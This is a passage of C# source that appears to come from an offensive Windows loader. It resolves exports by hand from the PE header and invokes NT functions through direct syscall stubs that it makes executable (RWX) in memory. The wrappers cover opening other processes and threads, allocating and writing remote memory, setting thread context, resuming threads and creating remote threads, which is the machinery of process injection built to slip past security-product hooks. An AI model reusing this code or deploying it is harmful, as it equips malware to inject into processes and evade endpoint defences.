	   CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS |  CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS |  CONTEXT_EXTENDED_REGISTERS
	}

	// x86 float save
	[StructLayout(LayoutKind.Sequential)]
	public struct FLOATING_SAVE_AREA
	{
		 public uint ControlWord;
		 public uint StatusWord;
		 public uint TagWord;
		 public uint ErrorOffset;
		 public uint ErrorSelector;
		 public uint DataOffset;
		 public uint DataSelector;
		 [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
		 public byte[] RegisterArea;
		 public uint Cr0NpxState;
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct M128A
	{
		 public ulong High;
		 public long Low;

		 public override string ToString()
		 {
		return string.Format("High:{0}, Low:{1}", this.High, this.Low);
		 }
	}

	// x64 save format
	[StructLayout(LayoutKind.Sequential, Pack = 16)]
	public struct XSAVE_FORMAT64
	{
		public ushort ControlWord;
		public ushort StatusWord;
		public byte TagWord;
		public byte Reserved1;
		public ushort ErrorOpcode;
		public uint ErrorOffset;
		public ushort ErrorSelector;
		public ushort Reserved2;
		public uint DataOffset;
		public ushort DataSelector;
		public ushort Reserved3;
		public uint MxCsr;
		public uint MxCsr_Mask;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
		public M128A[] FloatRegisters;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
		public M128A[] XmmRegisters;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
		public byte[] Reserved4;
	}

	// x64 context structure
	[StructLayout(LayoutKind.Sequential, Pack = 16)]
	public struct CONTEXT64
	{
		public ulong P1Home;
		public ulong P2Home;
		public ulong P3Home;
		public ulong P4Home;
		public ulong P5Home;
		public ulong P6Home;

		public CONTEXT_FLAGS ContextFlags;
		public uint MxCsr;

		public ushort SegCs;
		public ushort SegDs;
		public ushort SegEs;
		public ushort SegFs;
		public ushort SegGs;
		public ushort SegSs;
		public uint EFlags;

		public ulong Dr0;
		public ulong Dr1;
		public ulong Dr2;
		public ulong Dr3;
		public ulong Dr6;
		public ulong Dr7;

		public ulong Rax;
		public ulong Rcx;
		public ulong Rdx;
		public ulong Rbx;
		public ulong Rsp;
		public ulong Rbp;
		public ulong Rsi;
		public ulong Rdi;
		public ulong R8;
		public ulong R9;
		public ulong R10;
		public ulong R11;
		public ulong R12;
		public ulong R13;
		public ulong R14;
		public ulong R15;
		public ulong Rip;

		public XSAVE_FORMAT64 DUMMYUNIONNAME;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
		public M128A[] VectorRegister;
		public ulong VectorControl;

		public ulong DebugControl;
		public ulong LastBranchToRip;
		public ulong LastBranchFromRip;
		public ulong LastExceptionToRip;
		public ulong LastExceptionFromRip;
		}


		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct OSVERSIONINFOEXW
    {
        public int dwOSVersionInfoSize;
        public int dwMajorVersion;
        public int dwMinorVersion;
        public int dwBuildNumber;
        public int dwPlatformId;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
        public string szCSDVersion;
        public UInt16 wServicePackMajor;
        public UInt16 wServicePackMinor;
        public UInt16 wSuiteMask;
        public byte wProductType;
        public byte wReserved;
    }


		public struct STARTUPINFO
		{
				public int cb;
				public string lpReserved;
				public string lpDesktop;
				public string lpTitle;
				public int dwX;
				public int dwY;
				public int dwXSize;
				public int dwYSize;
				public int dwXCountChars;
				public int dwYCountChars;
				public int dwFillAttribute;
				public int dwFlags;
				public short wShowWindow;
				public short cbReserved2;
				public int lpReserved2;
				public IntPtr hStdInput;
				public IntPtr hStdOutput;
				public IntPtr hStdError;
		}

		public struct PROCESS_INFORMATION
		{
				public IntPtr hProcess;
				public IntPtr hThread;
				public int dwProcessId;
				public int dwThreadId;
		}

		[StructLayout(LayoutKind.Sequential,Pack=0)]
		public struct OBJECT_ATTRIBUTES
		{
		   public Int32 Length;
		   public IntPtr RootDirectory;
		   public IntPtr ObjectName;
		   public uint Attributes;
		   public IntPtr SecurityDescriptor;
		   public IntPtr SecurityQualityOfService;

		}


    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }

		[Flags]
    public enum ProcessAccessFlags : uint
    {
        All = 0x001F0FFF,
        Terminate = 0x00000001,
        CreateThread = 0x00000002,
        VirtualMemoryOperation = 0x00000008,
        VirtualMemoryRead = 0x00000010,
        VirtualMemoryWrite = 0x00000020,
        DuplicateHandle = 0x00000040,
        CreateProcess = 0x000000080,
        SetQuota = 0x00000100,
        SetInformation = 0x00000200,
        QueryInformation = 0x00000400,
        QueryLimitedInformation = 0x00001000,
        Synchronize = 0x00100000
    }

		[StructLayout(LayoutKind.Sequential, Pack=0)]
		public struct UNICODE_STRING
		{
		    public ushort Length;
		    public ushort MaximumLength;
		    public IntPtr Buffer;

		}

		public struct WIN_VER_INFO
		{
				public string chOSMajorMinor;
				public long dwBuildNumber;
				public UNICODE_STRING ProcName;
				public IntPtr hTargetPID;
				public string lpApiCall;
				public int SystemCall;
		}

		[Flags]
		public enum ProcessCreationFlags : uint
		{
			ZERO_FLAG = 0x00000000,
			CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
			CREATE_DEFAULT_ERROR_MODE = 0x04000000,
			CREATE_NEW_CONSOLE = 0x00000010,
			CREATE_NEW_PROCESS_GROUP = 0x00000200,
			CREATE_NO_WINDOW = 0x08000000,
			CREATE_PROTECTED_PROCESS = 0x00040000,
			CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
			CREATE_SEPARATE_WOW_VDM = 0x00001000,
			CREATE_SHARED_WOW_VDM = 0x00001000,
			CREATE_SUSPENDED = 0x00000004,
			CREATE_UNICODE_ENVIRONMENT = 0x00000400,
			DEBUG_ONLY_THIS_PROCESS = 0x00000002,
			DEBUG_PROCESS = 0x00000001,
			DETACHED_PROCESS = 0x00000008,
			EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
			INHERIT_PARENT_AFFINITY = 0x00010000
		}

		[Flags]
		public enum HandleFlags : uint
		{
		   None = 0,
		   INHERIT = 1
		}

		public enum ThreadInformationClass
		{
		    ThreadBasicInformation = 0,
		    ThreadTimes = 1,
		    ThreadPriority = 2,
		    ThreadBasePriority = 3,
		    ThreadAffinityMask = 4,
		    ThreadImpersonationToken = 5,
		    ThreadDescriptorTableEntry = 6,
		    ThreadEnableAlignmentFaultFixup = 7,
		    ThreadEventPair_Reusable = 8,
		    ThreadQuerySetWin32StartAddress = 9,
		    ThreadZeroTlsCell = 10,
		    ThreadPerformanceCount = 11,
		    ThreadAmILastThread = 12,
		    ThreadIdealProcessor = 13,
		    ThreadPriorityBoost = 14,
		    ThreadSetTlsArrayAddress = 15,   // Obsolete
		    ThreadIsIoPending = 16,
		    ThreadHideFromDebugger = 17,
		    ThreadBreakOnTermination = 18,
		    ThreadSwitchLegacyState = 19,
		    ThreadIsTerminated = 20,
		    ThreadLastSystemCall = 21,
		    ThreadIoPriority = 22,
		    ThreadCycleTime = 23,
		    ThreadPagePriority = 24,
		    ThreadActualBasePriority = 25,
		    ThreadTebInformation = 26,
		    ThreadCSwitchMon = 27,   // Obsolete
		    ThreadCSwitchPmu = 28,
		    ThreadWow64Context = 29,
		    ThreadGroupInformation = 30,
		    ThreadUmsInformation = 31,   // UMS
		    ThreadCounterProfiling = 32,
		    ThreadIdealProcessorEx = 33,
		    ThreadCpuAccountingInformation = 34,
		    ThreadSuspendCount = 35,
		    ThreadDescription = 38,
		    ThreadActualGroupAffinity = 41,
		    ThreadDynamicCodePolicy = 42,
		}

		[StructLayout(LayoutKind.Sequential)]
		public struct PROCESS_BASIC_INFORMATION
		{
		    public IntPtr ExitStatus;
		    public IntPtr PebBaseAddress;
		    public IntPtr AffinityMask;
		    public IntPtr BasePriority;
		    public UIntPtr UniqueProcessId;
		    public IntPtr InheritedFromUniqueProcessId;
		}

		public enum PROCESS_INFORMATION_CLASS : int
		{
				ProcessBasicInformation = 0,
				ProcessQuotaLimits,
				ProcessIoCounters,
				ProcessVmCounters,
				ProcessTimes,
				ProcessBasePriority,
				ProcessRaisePriority,
				ProcessDebugPort,
				ProcessExceptionPort,
				ProcessAccessToken,
				ProcessLdtInformation,
				ProcessLdtSize,
				ProcessDefaultHardErrorMode,
				ProcessIoPortHandlers,
				ProcessPooledUsageAndLimits,
				ProcessWorkingSetWatch,
				ProcessUserModeIOPL,
				ProcessEnableAlignmentFaultFixup,
				ProcessPriorityClass,
				ProcessWx86Information,
				ProcessHandleCount,
				ProcessAffinityMask,
				ProcessPriorityBoost,
				MaxProcessInfoClass,
				ProcessWow64Information = 26
		};

		public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
		{
				IntPtr FunctionPtr = IntPtr.Zero;
						Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
						Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
						Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
						Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
						Int64 pExport = 0;
						if (Magic == 0x010b)
						{
								pExport = OptHeader + 0x60;
						}
						else
						{
								pExport = OptHeader + 0x70;
						}
						Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
						Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
						Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
						Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
						Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
						Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
						Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));
						for (int i = 0; i < NumberOfNames; i++)
						{
								string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
								if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
								{
										Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
										Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
										FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
										break;
								}
						}
						return FunctionPtr;
		}

		public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false)
		{
				IntPtr hModule = GetLoadedModuleAddress(DLLName);
				return GetExportAddress(hModule, FunctionName);
		}

		public static IntPtr GetLoadedModuleAddress(string DLLName)
		{
				ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
				foreach (ProcessModule Mod in ProcModules)
				{
						if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
						{
								return Mod.BaseAddress;
						}
				}
				return IntPtr.Zero;
		}

		[SuppressUnmanagedCodeSecurity]
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate NTSTATUS RtlGetVersionX( ref OSVERSIONINFOEXW versionInfo );
		public static NTSTATUS RtlGetVersion( ref OSVERSIONINFOEXW versionInfo )
		{
				IntPtr proc = GetLibraryAddress(@"C:\Windows\System32\ntdll.dll", "RtlGetVersion", false);
				RtlGetVersionX RtlGetVersionFunc = (RtlGetVersionX)Marshal.GetDelegateForFunctionPointer(proc, typeof(RtlGetVersionX));
				return (NTSTATUS)RtlGetVersionFunc( ref versionInfo );
		}

		[SuppressUnmanagedCodeSecurity]
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate bool StartProcessX( string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment,string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation );
		public static bool StartProcess( string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment,string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation )
		{
				IntPtr proc = GetLibraryAddress(@"C:\Windows\System32\kernel32.dll", "CreateProcessA", false);
				StartProcessX StartProcessFunc = (StartProcessX)Marshal.GetDelegateForFunctionPointer(proc, typeof(StartProcessX));
				return (bool)StartProcessFunc( lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, ref lpStartupInfo, out lpProcessInformation );
		}

		[SuppressUnmanagedCodeSecurity]
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate NTSTATUS ProtectorX(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewProtect, ref UInt32 OldProtect );
		public static NTSTATUS Protector(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewProtect, ref UInt32 OldProtect)
		{
				IntPtr proc = GetLibraryAddress(@"C:\Windows\System32\ntdll.dll", "ZwProtectVirtualMemory", false);
				ProtectorX ProtectorFunc = (ProtectorX)Marshal.GetDelegateForFunctionPointer(proc, typeof(ProtectorX));
				return (NTSTATUS)ProtectorFunc( ProcessHandle, ref BaseAddress, ref RegionSize, NewProtect, ref OldProtect );
		}

		[SuppressUnmanagedCodeSecurity]
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate NTSTATUS ZwProtectVirtualMemoryX(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr NumberOfBytesToProtect, UInt32 NewAccessProtection, ref UInt32 lpNumberOfBytesWritten);
		public static NTSTATUS ZwProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr NumberOfBytesToProtect, UInt32 NewAccessProtection, ref UInt32 lpNumberOfBytesWritten, ref OSVERSIONINFOEXW osVersionInfo)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 16, ref osVersionInfo );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                UInt32 size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
								UInt32 oldprotect = 0;
                NTSTATUS status = Protector( new IntPtr(-1), ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect);
                ZwProtectVirtualMemoryX ZwProtectVirtualMemoryFunc = (ZwProtectVirtualMemoryX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwProtectVirtualMemoryX));
                return (NTSTATUS)ZwProtectVirtualMemoryFunc( ProcessHandle, ref BaseAddress, ref NumberOfBytesToProtect, NewAccessProtection, ref lpNumberOfBytesWritten);
            }
        }
    }

		[SuppressUnmanagedCodeSecurity]
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate NTSTATUS ZwWriteVirtualMemoryX(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten);
		public static NTSTATUS ZwWriteVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten, ref OSVERSIONINFOEXW osVersionInfo)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 3, ref osVersionInfo );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                UInt32 size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
								UInt32 oldprotect = 0;
                NTSTATUS status = ZwProtectVirtualMemory( ProcessHandle, ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect, ref osVersionInfo);
                ZwWriteVirtualMemoryX ZwWriteVirtualMemoryFunc = (ZwWriteVirtualMemoryX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwWriteVirtualMemoryX));
                return (NTSTATUS)ZwWriteVirtualMemoryFunc(ProcessHandle, BaseAddress, lpBuffer, nSize, ref lpNumberOfBytesWritten);
            }
        }
    }

		[SuppressUnmanagedCodeSecurity]
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate NTSTATUS ZwAllocateVirtualMemoryX( IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect );
		public static NTSTATUS ZwAllocateVirtualMemory( IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect, ref OSVERSIONINFOEXW osVersionInfo)
		{
			byte [] syscall = GetOSVersionAndReturnSyscall( 4, ref osVersionInfo );
			unsafe
			{
					fixed (byte* ptr = syscall)
					{

				IntPtr allocMemAddress = (IntPtr)ptr;
				IntPtr allocMemAddressCopy = (IntPtr)ptr;
				UInt32 size = (uint)syscall.Length;
				IntPtr sizeIntPtr = (IntPtr)size;
				UInt32 oldprotect = 0;
				NTSTATUS status = ZwProtectVirtualMemory( ProcessHandle, ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect, ref osVersionInfo);
				ZwAllocateVirtualMemoryX ZwAllocateVirtualMemoryFunc = (ZwAllocateVirtualMemoryX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwAllocateVirtualMemoryX));
				return (NTSTATUS)ZwAllocateVirtualMemoryFunc(ProcessHandle, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);
			}
		}
		}

		[SuppressUnmanagedCodeSecurity]
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate NTSTATUS ZwAllocateVirtualMemoryExX( IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 x, UInt32 y, IntPtr z, int ExtendedParameterCount );
		public static NTSTATUS ZwAllocateVirtualMemoryEx( IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 x, UInt32 y, IntPtr z, int ExtendedParameterCount, ref OSVERSIONINFOEXW osVersionInfo )
		{
			byte [] syscall = GetOSVersionAndReturnSyscall( 27, ref osVersionInfo );
			unsafe
			{
					fixed (byte* ptr = syscall)
					{

				IntPtr allocMemAddress = (IntPtr)ptr;
				IntPtr allocMemAddressCopy = (IntPtr)ptr;
				UInt32 size = (uint)syscall.Length;
				IntPtr sizeIntPtr = (IntPtr)size;
				UInt32 oldprotect = 0;
				NTSTATUS status = ZwProtectVirtualMemory( ProcessHandle, ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect, ref osVersionInfo);
				ZwAllocateVirtualMemoryExX ZwAllocateVirtualMemoryExXFunc = (ZwAllocateVirtualMemoryExX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwAllocateVirtualMemoryExX));
				return (NTSTATUS)ZwAllocateVirtualMemoryExXFunc( ProcessHandle, ref BaseAddress, ref RegionSize, x, y, z, ExtendedParameterCount );
			}
		}
		}

		[SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS ZwGetContextThreadX( IntPtr ProcessHandle, ref CONTEXT64 context);
    public static NTSTATUS ZwGetContextThread( IntPtr ProcessHandle, ref CONTEXT64 context, ref OSVERSIONINFOEXW osVersionInfo)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 12, ref osVersionInfo );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                UInt32 size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
								UInt32 oldprotect = 0;
								NTSTATUS status = ZwProtectVirtualMemory( new IntPtr(-1), ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect, ref osVersionInfo);
								ZwGetContextThreadX ZwGetContextThreadFunc = (ZwGetContextThreadX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwGetContextThreadX));
                return (NTSTATUS)ZwGetContextThreadFunc(ProcessHandle, ref context);
            }

        }
    }

		[SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS ZwTerminateProcessX( IntPtr ProcessHandle, out NTSTATUS errorStatus );
    public static NTSTATUS ZwTerminateProcess( IntPtr ProcessHandle, out NTSTATUS errorStatus, ref OSVERSIONINFOEXW osVersionInfo )
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 23, ref osVersionInfo );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                UInt32 size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
								UInt32 oldprotect = 0;
								NTSTATUS status = ZwProtectVirtualMemory( new IntPtr(-1), ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect, ref osVersionInfo);
								ZwTerminateProcessX ZwTerminateProcessXFunc = (ZwTerminateProcessX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwTerminateProcessX));
                return (NTSTATUS)ZwTerminateProcessXFunc( ProcessHandle, out errorStatus );
            }

        }
    }

		[SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS ZwSetContextThreadX( IntPtr ProcessHandle, CONTEXT64 context);
    public static NTSTATUS ZwSetContextThread( IntPtr ProcessHandle, CONTEXT64 context, ref OSVERSIONINFOEXW osVersionInfo)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 11, ref osVersionInfo );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                UInt32 size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
								UInt32 oldprotect = 0;
								NTSTATUS status = ZwProtectVirtualMemory( new IntPtr(-1), ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect, ref osVersionInfo);
                ZwSetContextThreadX ZwSetContextThreadFunc = (ZwSetContextThreadX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwSetContextThreadX));
                return (NTSTATUS)ZwSetContextThreadFunc(ProcessHandle, context);
            }

        }
    }

		[SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS ZwCloseX( IntPtr ProcessHandle);
    public static NTSTATUS ZwClose( IntPtr ProcessHandle, ref OSVERSIONINFOEXW osVersionInfo)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 13, ref osVersionInfo );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                UInt32 size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
								UInt32 oldprotect = 0;
								NTSTATUS status = ZwProtectVirtualMemory( ProcessHandle, ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect, ref osVersionInfo);
                ZwCloseX ZwCloseFunc = (ZwCloseX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwCloseX));
                return (NTSTATUS)ZwCloseFunc(ProcessHandle);
            }

        }
    }

		[SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS ZwResumeThreadX( IntPtr ProcessHandle, out ulong SuspendCount );
    public static NTSTATUS ZwResumeThread( IntPtr ProcessHandle, out ulong SuspendCount, ref OSVERSIONINFOEXW osVersionInfo)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 9, ref osVersionInfo );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                UInt32 size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
								UInt32 oldprotect = 0;
								NTSTATUS status = ZwProtectVirtualMemory( ProcessHandle, ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect, ref osVersionInfo);
								ZwResumeThreadX ZwResumeThreadFunc = (ZwResumeThreadX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwResumeThreadX));
                return (NTSTATUS)ZwResumeThreadFunc(ProcessHandle, out SuspendCount);
            }

        }
    }

		[SuppressUnmanagedCodeSecurity]
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate NTSTATUS ZwOpenThreadX( out IntPtr ProcessHandle, ThreadAccess processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid );
		public static NTSTATUS ZwOpenThread( out IntPtr ProcessHandle, ThreadAccess processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid, ref OSVERSIONINFOEXW osVersionInfo)
		{
				byte [] syscall = GetOSVersionAndReturnSyscall( 8, ref osVersionInfo);
				unsafe
				{
						fixed (byte* ptr = syscall)
						{
								IntPtr allocMemAddress = (IntPtr)ptr;
								IntPtr allocMemAddressCopy = (IntPtr)ptr;
								UInt32 size = (uint)syscall.Length;
								IntPtr sizeIntPtr = (IntPtr)size;
								UInt32 oldprotect = 0;
								NTSTATUS status = ZwProtectVirtualMemory( new IntPtr(-1), ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect, ref osVersionInfo);
								ZwOpenThreadX ZwOpenThreadFunc = (ZwOpenThreadX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwOpenThreadX));
								return (NTSTATUS)ZwOpenThreadFunc( out ProcessHandle, processAccess, objAttribute, ref clientid);
						}

				}
		}

[SuppressUnmanagedCodeSecurity]
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate NTSTATUS ZwOpenProcessX(ref IntPtr ProcessHandle, uint processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid);
public static NTSTATUS ZwOpenProcess(ref IntPtr ProcessHandle, uint processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid, ref OSVERSIONINFOEXW osVersionInfo)
{
	byte [] syscall = GetOSVersionAndReturnSyscall( 4, ref osVersionInfo );
	unsafe
	{
			fixed (byte* ptr = syscall)
			{
					IntPtr allocMemAddress = (IntPtr)ptr;
					IntPtr allocMemAddressCopy = (IntPtr)ptr;
					UInt32 size = (uint)syscall.Length;
					IntPtr sizeIntPtr = (IntPtr)size;
					UInt32 oldprotect = 0;
					NTSTATUS status = ZwProtectVirtualMemory( ProcessHandle, ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect, ref osVersionInfo);
					ZwOpenProcessX ZwOpenProcessFunc = (ZwOpenProcessX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwOpenProcessX));
					return (NTSTATUS)ZwOpenProcessFunc(ref ProcessHandle, processAccess, objAttribute, ref clientid);
			}
	}
}

[SuppressUnmanagedCodeSecurity]
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate NTSTATUS NtCreateThreadExX(out IntPtr threadHandle,uint desiredAccess,IntPtr objectAttributes,IntPtr processHandle,IntPtr lpStartAddress,IntPtr lpParameter,int createSuspended,uint stackZeroBits,uint sizeOfStackCommit,uint sizeOfStackReserve,IntPtr lpBytesBuffer);
public static NTSTATUS ZwCreateThreadEx(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr lpStartAddress, IntPtr lpParameter, int createSuspended, uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, IntPtr lpBytesBuffer, ref OSVERSIONINFOEXW osVersionInfo)
{
	byte [] syscall = GetOSVersionAndReturnSyscall( 2, ref osVersionInfo );
	unsafe
	{
			fixed (byte* ptr = syscall)
			{

		IntPtr allocMemAddress = (IntPtr)ptr;
		IntPtr allocMemAddressCopy = (IntPtr)ptr;
		uint size = (uint)syscall.Length;
		IntPtr sizeIntPtr = (IntPtr)size;
		UInt32 oldprotect = 0;
		NTSTATUS status = ZwProtectVirtualMemory( new IntPtr(-1), ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect, ref osVersionInfo);
		NtCreateThreadExX NtCreateThreadExFunc = (NtCreateThreadExX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(NtCreateThreadExX));
		return (NTSTATUS)NtCreateThreadExFunc(out threadHandle, desiredAccess, objectAttributes, processHandle, lpStartAddress, lpParameter, createSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, lpBytesBuffer);
	}
}
}

[SuppressUnmanagedCodeSecurity]
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate NTSTATUS ZwOpenProcessTokenX(IntPtr ProcessHandle,  int DesiredAccess, ref IntPtr TokenHandle);
